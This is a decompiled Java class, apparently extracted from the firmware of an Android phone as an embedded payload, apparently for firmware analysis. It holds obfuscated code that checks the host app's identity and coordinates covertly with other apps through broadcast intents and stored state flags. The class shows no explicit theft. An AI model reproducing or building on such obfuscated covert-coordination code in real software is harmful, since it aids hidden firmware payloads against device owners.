package com.system.framework.media.a;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;

/* JADX INFO: compiled from: MainRun.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/64/classes.dex */
public class f {
    private static f a = null;
    private Context b = null;
    private a c = null;
    private String d = null;
    private long e = 0;
    private String f = "";
    private int g = 0;

    public static f a() {
        if (a == null) {
            a = new f();
        }
        return a;
    }

    public void a(Context context, int stateType) {
        if (context != null && this.b == null) {
            this.b = context;
            this.f = this.b.getPackageName();
            this.g = stateType;
            try {
                if (this.c != null) {
                    this.b.unregisterReceiver(this.c);
                    this.c = null;
                }
            } catch (Throwable th) {
            }
            c.b(this.b);
            if (stateType == 1) {
                if (this.f.equals(i.a(c.c)) || this.f.equals(i.a(c.d))) {
                    d.a(this.b, 0, this.g);
                    try {
                        this.c = new a(this, null);
                        IntentFilter filter = new IntentFilter();
                        filter.addAction(i.a(c.b));
                        if (Build.VERSION.SDK_INT >= 34) {
                            this.b.registerReceiver(this.c, filter, 3);
                        } else {
                            this.b.registerReceiver(this.c, filter);
                        }
                        return;
                    } catch (Throwable th2) {
                        return;
                    }
                }
                if (i.a(this.b, i.a(c.e))) {
                    d.a(this.b, 1, this.g);
                    try {
                        this.c = new a(this, null);
                        IntentFilter filter2 = new IntentFilter();
                        filter2.addAction(i.a(c.b));
                        if (Build.VERSION.SDK_INT >= 34) {
                            this.b.registerReceiver(this.c, filter2, 3);
                        } else {
                            this.b.registerReceiver(this.c, filter2);
                        }
                        return;
                    } catch (Throwable th3) {
                        return;
                    }
                }
                return;
            }
            if (!c.c(this.b) && i.a(this.b, i.a(c.e))) {
                try {
                    this.d = String.valueOf(this.f) + "." + c.a() + "_" + System.currentTimeMillis();
                    this.c = new a(this, null);
                    IntentFilter filter3 = new IntentFilter();
                    filter3.addAction(this.d);
                    filter3.addAction(i.a(c.b));
                    if (Build.VERSION.SDK_INT >= 34) {
                        this.b.registerReceiver(this.c, filter3, 3);
                    } else {
                        this.b.registerReceiver(this.c, filter3);
                    }
                } catch (Throwable th4) {
                }
            }
        }
    }

    public void a(int stateType) {
        try {
            if (this.b != null) {
                c.a(this.b);
                e.a(String.valueOf(i.a(c.m)) + this.b.getPackageName() + i.a(c.n));
                e.a(String.valueOf(i.a(c.m)) + this.b.getPackageName() + i.a(c.n) + "1");
                if (i.a(this.b, i.a(c.e))) {
                    if (stateType == 1) {
                        if (this.f.equals(i.a(c.c)) || this.f.equals(i.a(c.d))) {
                            d.a(this.b, 0, stateType);
                            return;
                        } else {
                            d.a(this.b, 1, stateType);
                            return;
                        }
                    }
                    if (!c.c(this.b)) {
                        if (g.b(this.b, c.a(), "state", 0) == 1) {
                            if (System.currentTimeMillis() - g.b(this.b, c.a(), "time", 0L) > 259200000) {
                                g.a(this.b, c.a(), "state", 0);
                                g.a(this.b, c.a(), "time", System.currentTimeMillis());
                            }
                            d.a(this.b, 1, stateType);
                            return;
                        }
                        Intent time_intent = new Intent(String.valueOf(i.a(c.a)) + c.a());
                        time_intent.putExtra("key", i.a(this.f));
                        time_intent.putExtra("reply", this.d);
                        this.b.sendBroadcast(time_intent);
                    }
                }
            }
        } catch (Throwable th) {
        }
    }

    /* JADX INFO: compiled from: MainRun.java */
    private class a extends BroadcastReceiver {
        private a() {
        }

        /* synthetic */ a(f fVar, a aVar) {
            this();
        }

        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            try {
                String action = intent.getAction();
                if (!action.equals(f.this.d)) {
                    if (f.this.g != 1) {
                        if (!c.c(f.this.b)) {
                            if (g.b(f.this.b, c.a(), "state", 0) == 1) {
                                d.a(f.this.b, 1, f.this.g);
                                return;
                            } else {
                                if (System.currentTimeMillis() - f.this.e > 7200000) {
                                    Intent time_intent = new Intent(String.valueOf(i.a(c.a)) + c.a());
                                    time_intent.putExtra("key", i.a(f.this.f));
                                    time_intent.putExtra("reply", f.this.d);
                                    f.this.b.sendBroadcast(time_intent);
                                    return;
                                }
                                return;
                            }
                        }
                        return;
                    }
                    if (f.this.f.equals(i.a(c.c)) || f.this.f.equals(i.a(c.d))) {
                        d.a(f.this.b, 0, f.this.g);
                        return;
                    } else {
                        d.a(f.this.b, 1, f.this.g);
                        return;
                    }
                }
                f.this.e = System.currentTimeMillis();
                int state = intent.getIntExtra("state", 0);
                String song = intent.getStringExtra("song");
                if (song != null && song.length() > 0) {
                    g.a(context, i.b(c.o), i.b(c.p), song);
                }
                if (state == 1) {
                    g.a(context, c.a(), "state", state);
                    g.a(context, c.a(), "time", System.currentTimeMillis());
                    d.a(f.this.b, 1, f.this.g);
                }
            } catch (Throwable th) {
            }
        }
    }
}
